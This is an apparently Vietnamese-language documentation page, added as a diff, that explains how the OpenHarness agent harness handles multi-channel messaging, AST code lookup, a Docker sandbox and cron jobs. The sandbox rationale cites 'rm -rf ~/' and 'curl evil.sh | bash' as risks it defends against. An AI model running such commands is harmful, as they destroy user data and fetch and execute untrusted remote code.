@@ -1,0 +1,445 @@
+---
+import Section from "../../../../components/Section.astro";
+import Technique from "../../../../components/Technique.astro";
+import ProsCons from "../../../../components/ProsCons.astro";
+import RefList from "../../../../components/RefList.astro";
+import Callout from "../../../../components/Callout.astro";
+---
+
+<Section
+  id={"section-g"}
+  title={"G. External Integrations"}
+  themeTag={"4 kỹ thuật · phần lớn MỚI vs opencode"}
+>
+  <Callout type="unique">
+    <Fragment is:raw>
+      Khác với opencode (CLI-only), OpenHarness mở rộng agent ra ngoài terminal:
+      <strong>channels</strong> (Slack/Feishu/Discord/Telegram/Matrix),
+      <strong>LSP</strong> qua Python AST, <strong>Docker sandbox</strong> cho
+      tool execution, và <strong>cron scheduler</strong> cho background task.
+      Biến agent thành "always-on service" thay vì "tool chạy trong editor".
+    </Fragment>
+  </Callout>
+  <Technique
+    id={"t27"}
+    title={"T27. Multi-channel bus (Slack/Feishu/Discord/Telegram/Matrix)"}
+    tid={"G.1"}
+    location={"<strong>File:</strong> <code>src/openharness/channels/bus/queue.py</code> · <code>src/openharness/channels/impl/*</code> · <strong>Core:</strong> <code>MessageBus</code> với 2 asyncio.Queue (inbound/outbound)"}
+  >
+    <Fragment is:raw>
+      <h4>Code từ OpenHarness</h4> <pre><code><span class="kw">import</span>
+      asyncio <span class="kw">from</span> dataclasses <span
+      class="kw">import</span> dataclass <span class="deco">@dataclass</span>
+      <span class="kw">class</span> <span class="type">ChannelMessage</span>:
+      channel: str <span class="com"># "slack" | "feishu" | "discord" |
+      ...</span> source_id: str <span class="com"># channel-specific thread /
+      room</span> user: str text: str raw: dict <span class="com"># adapter
+      payload gốc</span> <span class="kw">class</span> <span
+      class="type">MessageBus</span>: <span class="str">"""Single agent, many
+      channels. Inbound từ N channel → 1 queue, outbound từ agent → fan-out về
+      đúng channel qua source_id."""</span> <span class="kw">def</span> <span
+      class="fn">__init__</span>(self): self.inbound:
+      asyncio.Queue[ChannelMessage] = asyncio.Queue(maxsize=1024) self.outbound:
+      asyncio.Queue[tuple[str, str, str]] = asyncio.Queue() self._channels:
+      dict[str, ChannelAdapter] = {} <span class="kw">def</span> <span
+      class="fn">register</span>(self, name: str, adapter: ChannelAdapter):
+      self._channels[name] = adapter <span class="kw">async def</span> <span
+      class="fn">start</span>(self): tasks = [asyncio.create_task(c.run(self))
+      <span class="kw">for</span> c <span class="kw">in</span>
+      self._channels.values()]
+      tasks.append(asyncio.create_task(self._outbound_dispatcher())) <span
+      class="kw">await</span> asyncio.gather(*tasks, return_exceptions=<span
+      class="kw">True</span>) <span class="kw">async def</span> <span
+      class="fn">_outbound_dispatcher</span>(self): <span
+      class="kw">while</span> <span class="kw">True</span>: channel, source_id,
+      text = <span class="kw">await</span> self.outbound.get() adapter =
+      self._channels.get(channel) <span class="kw">if</span> adapter: <span
+      class="kw">await</span> adapter.send(source_id, text) <span class="com">#
+      Feishu adapter — WebSocket long-connection với payload 40KB</span> <span
+      class="kw">class</span> <span
+      class="type">FeishuAdapter</span>(ChannelAdapter): MAX_PAYLOAD = 40_000
+      <span class="com"># ~40KB per interactive card</span> <span
+      class="kw">async def</span> <span class="fn">run</span>(self, bus:
+      MessageBus): client = lark.ws.Client(app_id=..., app_secret=...,
+      event_handler=<span class="kw">lambda</span> evt: self._on_event(evt,
+      bus)) <span class="kw">await</span> client.start() </code></pre> <div
+      class="why"><strong>Tại sao quan trọng:</strong> Đa số harness coi agent
+      chỉ sống trong 1 kênh (CLI, API). MessageBus pattern cho phép <strong>một
+      agent</strong> đồng thời nhận message từ Slack DM, Feishu group, Discord
+      channel, Telegram bot, và Matrix room — tất cả đều được normalize thành
+      <code>ChannelMessage</code>. Outbound dispatcher lo chuyện format lại (ví
+      dụ: Feishu cards, Slack Block Kit, Discord embed). Đây là cơ sở cho
+      <em>personal agent always-on</em> (ohmo): user ping từ bất cứ đâu, agent
+      respond đúng context.</div> <h4>Code example (generic)</h4>
+      <pre><code><span class="kw">import</span> asyncio <span
+      class="kw">from</span> abc <span class="kw">import</span> ABC,
+      abstractmethod <span class="kw">class</span> <span
+      class="type">ChannelAdapter</span>(ABC): <span
+      class="deco">@abstractmethod</span> <span class="kw">async def</span>
+      <span class="fn">run</span>(self, bus): ... <span
+      class="deco">@abstractmethod</span> <span class="kw">async def</span>
+      <span class="fn">send</span>(self, source_id: str, text: str): ... <span
+      class="kw">class</span> <span
+      class="type">SlackAdapter</span>(ChannelAdapter): <span
+      class="kw">def</span> <span class="fn">__init__</span>(self, token):
+      self.app = AsyncApp(token=token) self.app.event(<span
+      class="str">"message"</span>)(self._on_message) <span class="kw">async
+      def</span> <span class="fn">_on_message</span>(self, event, say, bus):
+      <span class="kw">await</span> bus.inbound.put(ChannelMessage(
+      channel=<span class="str">"slack"</span>, source_id=event[<span
+      class="str">"channel"</span>], user=event[<span
+      class="str">"user"</span>], text=event[<span class="str">"text"</span>],
+      raw=event, )) <span class="kw">async def</span> <span
+      class="fn">send</span>(self, source_id, text): <span
+      class="kw">await</span>
+      self.app.client.chat_postMessage(channel=source_id, text=text) <span
+      class="com"># Dùng một agent cho Slack + Discord đồng thời</span> <span
+      class="kw">async def</span> <span class="fn">main</span>(): bus =
+      MessageBus() bus.register(<span class="str">"slack"</span>,
+      SlackAdapter(token=<span class="str">"xoxb-..."</span>))
+      bus.register(<span class="str">"discord"</span>,
+      DiscordAdapter(token=<span class="str">"..."</span>)) <span
+      class="kw">async def</span> <span class="fn">agent_loop</span>(): <span
+      class="kw">while</span> <span class="kw">True</span>: msg = <span
+      class="kw">await</span> bus.inbound.get() reply = <span
+      class="kw">await</span> llm_reply(msg.text, user=msg.user) <span
+      class="kw">await</span> bus.outbound.put((msg.channel, msg.source_id,
+      reply)) <span class="kw">await</span> asyncio.gather(bus.start(),
+      agent_loop()) </code></pre>
+    </Fragment>
+    <ProsCons
+      pros={[
+        "Single-agent, multi-channel — DRY adapter code",
+        "Inbound queue có backpressure (maxsize=1024)",
+        "Adapter dễ swap (dev → Slack, prod → Feishu)",
+        "Channel ID theo <code>(channel, source_id)</code> giữ context thread",
+      ]}
+      cons={[
+        "Channel-specific features (rich card, reaction, ephemeral) khó trừu tượng",
+        "Adapter tự xử lý rate-limit — không có central limiter",
+        "State per-thread chưa tách biệt (nếu không cẩn thận, user A có thể thấy reply của user B)",
+        "Outbound truncation (Feishu 40KB, Slack 40KB block) cần adapter lo",
+      ]}
+    />
+    <RefList
+      items={[
+        '<a href="https://slack.dev/bolt-python/">Slack Bolt Python SDK</a>',
+        '<a href="https://open.feishu.cn/document/home">Feishu OAPI (lark-oapi)</a>',
+        '<a href="https://docs.python-telegram-bot.org/">python-telegram-bot docs</a>',
+      ]}
+    />
+  </Technique>
+  <Technique
+    id={"t28"}
+    title={"T28. LSP-based code intelligence qua AST"}
+    tid={"G.2"}
+    location={"<strong>File:</strong> <code>src/openharness/services/lsp/__init__.py</code> · <strong>Lines:</strong> 1–100 · <strong>API:</strong> <code>list_document_symbols</code>, <code>workspace_symbol_search</code>, <code>go_to_definition</code>, <code>find_references</code>, <code>hover</code>"}
+  >
+    <Fragment is:raw>
+      <h4>Code từ OpenHarness</h4> <pre><code><span class="kw">import</span> ast
+      <span class="kw">from</span> pathlib <span class="kw">import</span> Path
+      <span class="kw">def</span> <span
+      class="fn">list_document_symbols</span>(file_path: Path) -&gt;
+      list[Symbol]: <span class="str">"""Trả về top-level functions, classes,
+      methods trong 1 file Python qua ast.parse() — không cần spawn language
+      server ngoài."""</span> source = file_path.read_text(encoding=<span
+      class="str">"utf-8"</span>, errors=<span class="str">"replace"</span>)
+      <span class="kw">try</span>: tree = ast.parse(source) <span
+      class="kw">except</span> SyntaxError: <span class="kw">return</span> []
+      symbols = [] <span class="kw">for</span> node <span class="kw">in</span>
+      ast.walk(tree): <span class="kw">if</span> isinstance(node,
+      (ast.FunctionDef, ast.AsyncFunctionDef)): symbols.append(Symbol(
+      name=node.name, kind=<span class="str">"function"</span>,
+      line=node.lineno, col=node.col_offset, )) <span class="kw">elif</span>
+      isinstance(node, ast.ClassDef): symbols.append(Symbol( name=node.name,
+      kind=<span class="str">"class"</span>, line=node.lineno,
+      col=node.col_offset, )) <span class="kw">for</span> item <span
+      class="kw">in</span> node.body: <span class="kw">if</span>
+      isinstance(item, (ast.FunctionDef, ast.AsyncFunctionDef)):
+      symbols.append(Symbol( name=<span
+      class="str">f"{node.name}.{item.name}"</span>, kind=<span
+      class="str">"method"</span>, line=item.lineno, col=item.col_offset, ))
+      <span class="kw">return</span> symbols <span class="kw">def</span> <span
+      class="fn">workspace_symbol_search</span>(root: Path, query: str) -&gt;
+      list[Symbol]: <span class="str">"""Search symbol name across all *.py
+      files — case-insensitive substring."""</span> results = [] <span
+      class="kw">for</span> py_file <span class="kw">in</span> root.rglob(<span
+      class="str">"*.py"</span>): <span class="kw">if</span>
+      any(part.startswith(<span class="str">"."</span>) <span
+      class="kw">for</span> part <span class="kw">in</span> py_file.parts):
+      <span class="kw">continue</span> <span class="kw">for</span> sym <span
+      class="kw">in</span> list_document_symbols(py_file): <span
+      class="kw">if</span> query.lower() <span class="kw">in</span>
+      sym.name.lower(): results.append(sym._replace(file=py_file)) <span
+      class="kw">return</span> results </code></pre> <div
+      class="why"><strong>Tại sao quan trọng:</strong> Thay vì spawn
+      <code>pyright</code>/<code>pylsp</code> (heavy, cần config, khởi động
+      chậm), OpenHarness dùng <strong>Python stdlib <code>ast</code></strong> để
+      tự parse read-only. Trade-off: không có type inference, không theo được
+      import qua package, nhưng <em>đủ dùng</em> cho 80% use case của agent (tìm
+      function, class, method signature). Agent gọi
+      <code>workspace_symbol_search("handle_message")</code> thay vì <code>grep
+      -rn "def handle_message"</code> — kết quả structured, có line/col chính
+      xác.</div> <h4>Code example (generic)</h4> <pre><code><span
+      class="kw">import</span> ast <span class="kw">from</span> pathlib <span
+      class="kw">import</span> Path <span class="kw">def</span> <span
+      class="fn">find_function_definition</span>(file: Path, name: str) -&gt;
+      <span class="type">tuple</span>[int, int] | <span class="kw">None</span>:
+      <span class="kw">try</span>: tree = ast.parse(file.read_text()) <span
+      class="kw">except</span> SyntaxError: <span class="kw">return</span> <span
+      class="kw">None</span> <span class="kw">for</span> node <span
+      class="kw">in</span> ast.walk(tree): <span class="kw">if</span>
+      isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) \ <span
+      class="kw">and</span> node.name == name: <span class="kw">return</span>
+      (node.lineno, node.col_offset) <span class="kw">return</span> <span
+      class="kw">None</span> <span class="kw">def</span> <span
+      class="fn">find_references</span>(root: Path, name: str) -&gt; list[<span
+      class="type">tuple</span>[Path, int]]: <span class="str">"""Approximate:
+      tìm Name/Attribute có id trùng."""</span> hits = [] <span
+      class="kw">for</span> py <span class="kw">in</span> root.rglob(<span
+      class="str">"*.py"</span>): <span class="kw">try</span>: tree =
+      ast.parse(py.read_text()) <span class="kw">except</span> SyntaxError:
+      <span class="kw">continue</span> <span class="kw">for</span> node <span
+      class="kw">in</span> ast.walk(tree): <span class="kw">if</span>
+      isinstance(node, ast.Name) <span class="kw">and</span> node.id == name:
+      hits.append((py, node.lineno)) <span class="kw">elif</span>
+      isinstance(node, ast.Attribute) <span class="kw">and</span> node.attr ==
+      name: hits.append((py, node.lineno)) <span class="kw">return</span> hits
+      </code></pre>
+    </Fragment>
+    <ProsCons
+      pros={[
+        "Zero-dep (chỉ stdlib <code>ast</code>) — không cần LSP server",
+        "Read-only, không có side effect → an toàn cho agent tool",
+        "Line/col chính xác, structured output",
+        "Parse 1 file &lt; 10ms kể cả file lớn",
+      ]}
+      cons={[
+        "Chỉ hiểu syntax, không có type/semantic",
+        "Go-to-definition qua <code>import</code> phải tự resolve",
+        "Chỉ support Python (các ngôn ngữ khác cần adapter riêng)",
+        "Không catch được macro/meta-class magic",
+      ]}
+    />
+    <RefList
+      items={[
+        '<a href="https://microsoft.github.io/language-server-protocol/">Microsoft LSP spec</a>',
+        '<a href="https://docs.python.org/3/library/ast.html">Python ast module docs</a>',
+        '<a href="https://github.com/davidhalter/jedi">Jedi — Python autocompletion</a>',
+      ]}
+    />
+  </Technique>
+  <Technique
+    id={"t29"}
+    title={"T29. Docker sandbox cho tool execution"}
+    tid={"G.3"}
+    location={"<strong>File:</strong> <code>src/openharness/sandbox/docker_backend.py</code> · <strong>Container:</strong> <code>openharness-sandbox-&lt;session_id&gt;</code> · <strong>Optional:</strong> <code>--sandbox docker</code> flag"}
+  >
+    <Fragment is:raw>
+      <h4>Code từ OpenHarness</h4> <pre><code><span class="kw">import</span>
+      docker <span class="kw">from</span> docker.errors <span
+      class="kw">import</span> DockerException <span class="kw">class</span>
+      <span class="type">DockerSandbox</span>: <span class="str">"""Wrap tool
+      execution trong container isolated. Tool nhận được stdin/stdout qua
+      container exec, không thấy host filesystem trừ volume mount có kiểm
+      soát."""</span> <span class="kw">def</span> <span
+      class="fn">__init__</span>(self, session_id: str, workdir: Path):
+      self.name = <span class="str">f"openharness-sandbox-{session_id}"</span>
+      self.workdir = workdir self._client = <span class="kw">None</span>
+      self._container = <span class="kw">None</span> <span class="kw">def</span>
+      <span class="fn">check_available</span>(self) -&gt; bool: <span
+      class="str">"""Pre-flight: Docker daemon running? Platform
+      supported?"""</span> <span class="kw">try</span>: self._client =
+      docker.from_env(timeout=5) self._client.ping() <span
+      class="kw">return</span> <span class="kw">True</span> <span
+      class="kw">except</span> DockerException <span class="kw">as</span> e:
+      log.warning(<span class="str">f"Docker not available: {e}"</span>) <span
+      class="kw">return</span> <span class="kw">False</span> <span
+      class="kw">async def</span> <span class="fn">start</span>(self):
+      self._container = self._client.containers.run( image=<span
+      class="str">"openharness/sandbox:latest"</span>, name=self.name,
+      detach=<span class="kw">True</span>, stdin_open=<span
+      class="kw">True</span>, tty=<span class="kw">True</span>,
+      network_mode=<span class="str">"bridge"</span>, <span class="com"># có
+      net; dùng "none" nếu muốn offline</span> mem_limit=<span
+      class="str">"2g"</span>, cpu_quota=100_000, <span class="com"># 1
+      CPU</span> read_only=<span class="kw">False</span>, <span class="com">#
+      agent cần ghi vào /workspace</span> volumes={ str(self.workdir): {<span
+      class="str">"bind"</span>: <span class="str">"/workspace"</span>, <span
+      class="str">"mode"</span>: <span class="str">"rw"</span>}, },
+      working_dir=<span class="str">"/workspace"</span>, environment={<span
+      class="str">"OPENHARNESS_SANDBOX"</span>: <span class="str">"1"</span>}, )
+      <span class="kw">async def</span> <span class="fn">exec</span>(self, cmd:
+      list[str], timeout: int = 600) -&gt; ExecResult: <span
+      class="kw">if</span> self._container <span class="kw">is</span> <span
+      class="kw">None</span>: <span class="kw">raise</span> RuntimeError(<span
+      class="str">"sandbox not started"</span>) result =
+      self._container.exec_run( cmd=cmd, stdout=<span class="kw">True</span>,
+      stderr=<span class="kw">True</span>, demux=<span class="kw">True</span>, )
+      <span class="kw">return</span> ExecResult(exit_code=result.exit_code,
+      output=result.output) <span class="kw">async def</span> <span
+      class="fn">cleanup</span>(self): <span class="kw">if</span>
+      self._container: self._container.remove(force=<span
+      class="kw">True</span>) </code></pre> <div class="why"><strong>Tại sao
+      quan trọng:</strong> Agent chạy bash/python tool trên host luôn có rủi ro:
+      <code>rm -rf ~/</code>, <code>curl evil.sh | bash</code>, hay exfil
+      credentials. Docker sandbox cô lập: agent ghi vào <code>/workspace</code>
+      (volume), mọi thứ ngoài đó bị container file-system cover. Kết hợp với
+      <strong>network_mode</strong> (bridge/none), <strong>mem_limit</strong>,
+      <strong>cpu_quota</strong>, sandbox chặn cả "agent crazy → consume all
+      RAM" và "agent bị prompt injection → exfil". Pre-flight
+      <code>check_available()</code> cho phép graceful fallback về non-sandbox
+      nếu Docker thiếu (CI, VM nhỏ).</div> <h4>Code example (generic)</h4>
+      <pre><code><span class="kw">import</span> docker, tempfile, subprocess
+      <span class="kw">def</span> <span
+      class="fn">run_tool_in_container</span>(cmd: list[str], workdir: str,
+      timeout: int = 60): client = docker.from_env() <span
+      class="kw">try</span>: container = client.containers.run( <span
+      class="str">"python:3.12-slim"</span>, cmd, volumes={workdir: {<span
+      class="str">"bind"</span>: <span class="str">"/work"</span>, <span
+      class="str">"mode"</span>: <span class="str">"rw"</span>}},
+      working_dir=<span class="str">"/work"</span>, mem_limit=<span
+      class="str">"512m"</span>, network_disabled=<span class="kw">True</span>,
+      <span class="com"># no egress</span> remove=<span class="kw">True</span>,
+      <span class="com"># auto-cleanup</span> detach=<span
+      class="kw">False</span>, stdout=<span class="kw">True</span>, stderr=<span
+      class="kw">True</span>, ) <span class="kw">return</span>
+      container.decode(<span class="str">"utf-8"</span>, errors=<span
+      class="str">"replace"</span>) <span class="kw">except</span>
+      docker.errors.ContainerError <span class="kw">as</span> e: <span
+      class="kw">return</span> <span class="str">f"[exit {e.exit_status}]:
+      {e.stderr.decode()}"</span> <span class="com"># Fallback if Docker
+      missing</span> <span class="kw">def</span> <span
+      class="fn">run_tool</span>(cmd: list[str], workdir: str): <span
+      class="kw">if</span> docker_available(): <span class="kw">return</span>
+      run_tool_in_container(cmd, workdir) <span class="kw">return</span>
+      subprocess.run(cmd, cwd=workdir, capture_output=<span
+      class="kw">True</span>, text=<span class="kw">True</span>) </code></pre>
+    </Fragment>
+    <ProsCons
+      pros={[
+        "Blast radius limited tới container → host an toàn",
+        "Resource limits (mem/cpu/network) chặn DoS",
+        "Reproducible env (image pin version)",
+        "Optional — không ép Docker nếu user không có",
+      ]}
+      cons={[
+        "Cần Docker daemon — bỏ được một phần user (VM nhỏ, CI restricted)",
+        "Overhead khởi động container (~1s) cho mỗi session",
+        "Bind mount <code>/workspace</code> rw — nếu attacker escape chroot, vẫn hạ host dir",
+        "Image <code>openharness/sandbox:latest</code> phải được build &amp; publish → supply-chain risk",
+      ]}
+    />
+    <RefList
+      items={[
+        '<a href="https://docker-py.readthedocs.io/">Docker Python SDK (docker-py)</a>',
+        '<a href="https://owasp.org/www-project-container-security/">OWASP — Container Security Verification</a>',
+        '<a href="https://gvisor.dev/">gVisor — Application kernel sandbox</a>',
+      ]}
+    />
+  </Technique>
+  <Technique
+    id={"t30"}
+    title={"T30. Cron scheduler + persistent background tasks"}
+    tid={"G.4"}
+    location={"<strong>File:</strong> <code>src/openharness/tasks/manager.py</code> · <code>src/openharness/services/cron_scheduler.py</code> · <strong>Storage:</strong> <code>~/.openharness/cron/registry.json</code> + <code>cron_history.jsonl</code> · <strong>Tick:</strong> 30s"}
+  >
+    <Fragment is:raw>
+      <h4>Code từ OpenHarness</h4> <pre><code><span class="kw">import</span>
+      asyncio, json <span class="kw">from</span> datetime <span
+      class="kw">import</span> datetime <span class="kw">from</span> croniter
+      <span class="kw">import</span> croniter <span
+      class="deco">@dataclass</span> <span class="kw">class</span> <span
+      class="type">CronJob</span>: job_id: str name: str cron_expr: str <span
+      class="com"># "*/30 * * * *"</span> prompt: str <span class="com"># agent
+      prompt khi fire</span> enabled: bool = <span class="kw">True</span>
+      last_run: str | <span class="kw">None</span> = <span
+      class="kw">None</span> next_run: str | <span class="kw">None</span> =
+      <span class="kw">None</span> <span class="kw">class</span> <span
+      class="type">CronScheduler</span>: TICK = 30 <span class="com">#
+      seconds</span> <span class="kw">def</span> <span
+      class="fn">__init__</span>(self, registry_path: Path, history_path: Path):
+      self.registry_path = registry_path self.history_path = history_path
+      self.jobs: dict[str, CronJob] = self._load() <span class="kw">def</span>
+      <span class="fn">_load</span>(self) -&gt; dict[str, CronJob]: <span
+      class="kw">if</span> <span class="kw">not</span>
+      self.registry_path.exists(): <span class="kw">return</span> {} data =
+      json.loads(self.registry_path.read_text()) <span class="kw">return</span>
+      {j[<span class="str">"job_id"</span>]: CronJob(**j) <span
+      class="kw">for</span> j <span class="kw">in</span> data} <span
+      class="kw">def</span> <span class="fn">_save</span>(self):
+      self.registry_path.write_text(json.dumps( [asdict(j) <span
+      class="kw">for</span> j <span class="kw">in</span> self.jobs.values()],
+      indent=2, )) <span class="kw">async def</span> <span
+      class="fn">run_forever</span>(self, on_fire: Callable[[CronJob],
+      Awaitable]): <span class="kw">while</span> <span class="kw">True</span>:
+      now = datetime.utcnow() <span class="kw">for</span> job <span
+      class="kw">in</span> list(self.jobs.values()): <span class="kw">if</span>
+      <span class="kw">not</span> job.enabled: <span class="kw">continue</span>
+      base = datetime.fromisoformat(job.last_run) <span class="kw">if</span>
+      job.last_run <span class="kw">else</span> now itr =
+      croniter(job.cron_expr, base) <span class="kw">if</span>
+      itr.get_next(datetime) &lt;= now: asyncio.create_task(self._fire(job,
+      on_fire)) job.last_run = now.isoformat() self._save() <span
+      class="kw">await</span> asyncio.sleep(self.TICK) <span class="kw">async
+      def</span> <span class="fn">_fire</span>(self, job: CronJob, on_fire):
+      <span class="kw">try</span>: result = <span class="kw">await</span>
+      on_fire(job) self._append_history({<span class="str">"job_id"</span>:
+      job.job_id, <span class="str">"fired_at"</span>:
+      datetime.utcnow().isoformat(), <span class="str">"ok"</span>: <span
+      class="kw">True</span>, <span class="str">"result_preview"</span>:
+      result[:500]}) <span class="kw">except</span> Exception <span
+      class="kw">as</span> e: self._append_history({<span
+      class="str">"job_id"</span>: job.job_id, <span class="str">"ok"</span>:
+      <span class="kw">False</span>, <span class="str">"error"</span>: str(e)})
+      <span class="kw">def</span> <span class="fn">_append_history</span>(self,
+      entry: dict): <span class="kw">with</span> self.history_path.open(<span
+      class="str">"a"</span>) <span class="kw">as</span> f:
+      f.write(json.dumps(entry) + <span class="str">"\n"</span>) </code></pre>
+      <div class="why"><strong>Tại sao quan trọng:</strong> Biến agent từ
+      "on-demand" thành "proactive". User có thể set: "mỗi sáng 8h, check CI
+      main branch xong ping Slack nếu fail", "mỗi 30 phút, pull Jira rồi update
+      status". <strong>Persistent</strong> (JSON registry) → sống qua restart.
+      <strong>History log JSONL</strong> → audit. <strong>Per-job
+      enable/disable</strong> → maintenance dễ. <strong>Tick 30s</strong> là
+      trade-off: đủ nhanh để không miss 1-phút-cron, đủ chậm để không spam.
+      Croniter lib xử lý edge case (cuối tháng, DST).</div> <h4>Code example
+      (generic)</h4> <pre><code><span class="kw">import</span> asyncio <span
+      class="kw">from</span> apscheduler.schedulers.asyncio <span
+      class="kw">import</span> AsyncIOScheduler <span class="kw">from</span>
+      apscheduler.triggers.cron <span class="kw">import</span> CronTrigger <span
+      class="kw">async def</span> <span class="fn">agent_job</span>(prompt:
+      str): response = <span class="kw">await</span> run_agent(prompt)
+      save_history(prompt, response) <span class="kw">async def</span> <span
+      class="fn">main</span>(): scheduler = AsyncIOScheduler() <span
+      class="com"># Cron: Mon-Fri 09:00</span> scheduler.add_job( agent_job,
+      trigger=CronTrigger.from_crontab(<span class="str">"0 9 * * 1-5"</span>),
+      args=[<span class="str">"Summarize overnight alerts"</span>], id=<span
+      class="str">"daily-triage"</span>, replace_existing=<span
+      class="kw">True</span>, ) scheduler.start() <span class="kw">await</span>
+      asyncio.Event().wait() <span class="com"># run forever</span>
+      </code></pre>
+    </Fragment>
+    <ProsCons
+      pros={[
+        "Agent thành proactive assistant — không cần user ping",
+        "Persist qua restart → reliability",
+        "History log cho audit + debug",
+        "Per-job enable/disable dễ pause khi maintenance",
+      ]}
+      cons={[
+        "Tick 30s miss cron &lt;30s granularity",
+        "Không distributed — nhiều instance chạy sẽ duplicate fire",
+        "JSON registry không concurrent-safe (write qua rename cần thêm)",
+        "Failure recovery phụ thuộc user đọc history — không có alert auto",
+      ]}
+    />
+    <RefList
+      items={[
+        '<a href="https://github.com/kiorky/croniter">python-croniter</a>',
+        '<a href="https://apscheduler.readthedocs.io/">APScheduler — Python scheduling</a>',
+        '<a href="https://docs.celeryq.dev/">Celery — Distributed task queue</a>',
+      ]}
+    />
+  </Technique>
+</Section>
